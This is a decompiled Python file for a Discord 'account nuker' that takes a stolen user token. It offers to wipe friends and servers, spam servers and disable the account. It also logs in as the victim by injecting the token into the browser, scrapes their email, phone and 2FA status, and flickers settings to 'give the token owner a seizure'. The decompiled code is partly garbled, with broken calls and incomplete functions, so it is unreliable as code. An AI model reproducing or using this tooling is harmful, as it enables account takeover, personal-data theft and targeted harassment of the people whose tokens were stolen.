# File: accnuker.pyc (Python 3.9)

import discord
import asyncio
import codecs
import sys
import io
import random
import threading
import requests
import discord
import os
import colorama
from discord.ext import commands
from discord.ext.commands import Bot
import pyfiglet
from pyfiglet import Figlet
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
init(True, **('convert',))

clear = lambda : os.system('clear')
clear()
bot = commands.Bot('-', True, **('command_prefix', 'self_bot'))
bot.remove_command('help')
token = input('\x1b[95m\n\t\t                                                                                                                                             \t\n\x1b[91m\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91 \xe2\x96\x91\xe2\x96\x91   \xe2\x96\x91\xe2\x96\x91 \xe2\x96\x91\xe2\x96\x91 \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91  \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91  \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91 \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91  \n\xe2\x96\x92\xe2\x96\x92      \xe2\x96\x92\xe2\x96\x92  \xe2\x96\x92\xe2\x96\x92  \xe2\x96\x92\xe2\x96\x92 \xe2\x96\x92\xe2\x96\x92   \xe2\x96\x92\xe2\x96\x92 \xe2\x96\x92\xe2\x96\x92   \xe2\x96\x92\xe2\x96\x92 \xe2\x96\x92\xe2\x96\x92      \xe2\x96\x92\xe2\x96\x92   \xe2\x96\x92\xe2\x96\x92 \n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92 \xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92   \xe2\x96\x92\xe2\x96\x92 \xe2\x96\x92\xe2\x96\x92   \xe2\x96\x92\xe2\x96\x92 \xe2\x96\x92\xe2\x96\x92   \xe2\x96\x92\xe2\x96\x92 \xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92   \xe2\x96\x92\xe2\x96\x92   \xe2\x96\x92\xe2\x96\x92 \n     \xe2\x96\x93\xe2\x96\x93 \xe2\x96\x93\xe2\x96\x93  \xe2\x96\x93\xe2\x96\x93  \xe2\x96\x93\xe2\x96\x93 \xe2\x96\x93\xe2\x96\x93   \xe2\x96\x93\xe2\x96\x93 \xe2\x96\x93\xe2\x96\x93   \xe2\x96\x93\xe2\x96\x93 \xe2\x96\x93\xe2\x96\x93      \xe2\x96\x93\xe2\x96\x93   \xe2\x96\x93\xe2\x96\x93 \n\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  \nMade by \xe2\x80\xa0\xe2\x80\xa0#7777 | discord.gg/raided                                                     \n\x1b[91m\n\n[>] Token: \x1b[00m')
head = {
    'Authorization': str(token) }
src = requests.get('https://discordapp.com/api/v6/users/@me', head, **('headers',))
if src.status_code == 200:
    print('[Token Valid]')
else:
    print('[Invalid Token]')
input('Press Any Key To Exit...')
exit(0)
print('\n')
print('[1] > NUKE')
print('[2] > REMOVE ALL FRIENDS')
print('[3] > DELETE AND LEAVE ALL SERVERS')
print('[4] > SPAM SERVERS')
print('[5] > DISABLE ACCOUNT')
print('[6] > LOGIN WITH TOKEN')
print('[7] > SCRAPE ACCOUNT INFO')
print('[8] > GIVE TOKEN OWNER A SEIZURE')
print('\n')

def nuke():
    print('Loading...')
    print('\n')
    
    async def on_ready(times = None):
        pass
    # WARNING: Decompyle incomplete

    on_ready = None(on_ready)
    bot.run(token, False, **('bot',))


def unfriender():
    print('Loading...')
    
    async def on_ready():
        pass
    # WARNING: Decompyle incomplete

    on_ready = bot.event(on_ready)
    bot.run(token, False, **('bot',))


def leaver():
    print('Loading...')
    
    async def on_ready():
        pass
    # WARNING: Decompyle incomplete

    on_ready = bot.event(on_ready)
    bot.run(token, False, **('bot',))


def spamservers():
    print('Loading...')
    
    async def on_ready(times = None):
        pass
    # WARNING: Decompyle incomplete

    on_ready = None(on_ready)
    bot.run(token, False, **('bot',))


def tokenDisable(token):
    print('STATUS : [DISABLING TOKEN]')
    r = requests.patch('https://discordapp.com/api/v6/users/@me', {
        'Authorization': token }, **('headers',))
    if r.status_code == 400:
        print('Account disabled successfully')
        input('Press any key to exit...')
        return None
    None('Invalid token')
    input('Press any key to exit...')


def tokenLogin(token):
    print('STATUS : [LOGIN WITH TOKEN]')
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option('detach', True)
    driver = webdriver.Chrome('chromedriver.exe', opts, **('options',))
    script = '\n            function login(token) {\n            setInterval(() => {\n            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`\n            }, 50);\n            setTimeout(() => {\n            location.reload();\n            }, 2500);\n            }\n            '
    driver.get('https://discord.com/login')
    driver.execute_script(script + f'''\nlogin("{token}")''')


def tokenInfo(token):
    print('STATUS : [TOKEN INFO]')
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json' }
    r = requests.get('https://discord.com/api/v6/users/@me', headers, **('headers',))
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        if phone:
            1[f'''{''}''']['\n            ['][f'''{Fore.RED}''']['Token'][f'''{Fore.RESET}'''][']           '](1[f'''{''}''']['\n            ['][f'''{Fore.RED}''']['Token'][f'''{Fore.RESET}'''][']           '][f'''{token}'''](1[f'''{''}''']['\n            ['][f'''{Fore.RED}''']['Token'][f'''{Fore.RESET}'''][']           '][f'''{token}''']['\n            ']))
            input()
            return None
        return []['\n            ['][f'''{Fore.RED}''']['User ID'][f'''{Fore.RESET}'''][']         '][f'''{userID}''']['\n            ['][f'''{Fore.RED}''']['User Name'][f'''{Fore.RESET}'''][']       '][f'''{userName}''']['\n            ['][f'''{Fore.RED}''']['2 Factor'][f'''{Fore.RESET}'''][']        '][f'''{mfa}''']['\n            ['][f'''{Fore.RED}''']['Email'][f'''{Fore.RESET}'''][']           '][f'''{email}''']['\n            ['][f'''{Fore.RED}''']['Phone number'][f'''{Fore.RESET}'''][']    ']


def crashdiscord(token):
    print('STATUS : [DISCORD CRASHER]')
    print('\n')
    print('CRASHING THE TOKEN OWNER DISCORD...')
    print('IF YOU WANNA KEEP CRASHING HIS DISCORD KEEP THE TOOL WORKING')
    headers = {
        'Authorization': token }
    modes = cycle([
        'light',
        'dark'])
    setting = {
        'theme': next(modes),
        'locale': random.choice([
            'ja',
            'zh-TW',
            'ko',
            'zh-CN']) }
    requests.patch('https://discord.com/api/v6/users/@me/settings', headers, setting, **('headers', 'json'))
    continue


def mainanswer():
    answer = input('\x1b[1;00m[\x1b[91mpick\x1b[1;00m]-\x1b[91m\xe6\xb6\x99\x1b[00m Choose : ')
    if answer == '1':
        nuke()
        return None
    if None == '2':
        unfriender()
        return None
    if None == '3':
        leaver()
        return None
    if None == '4':
        spamservers()
        return None
    if None == '5':
        tokenDisable(token)
        return None
    if None == '6':
        tokenLogin(token)
        return None
    if None == '7':
        tokenInfo(token)
        return None
    if None == '8':
        crashdiscord(token)
        return None
    None('Incorrect... Select The Correct Numbers...')
    mainanswer()

mainanswer()
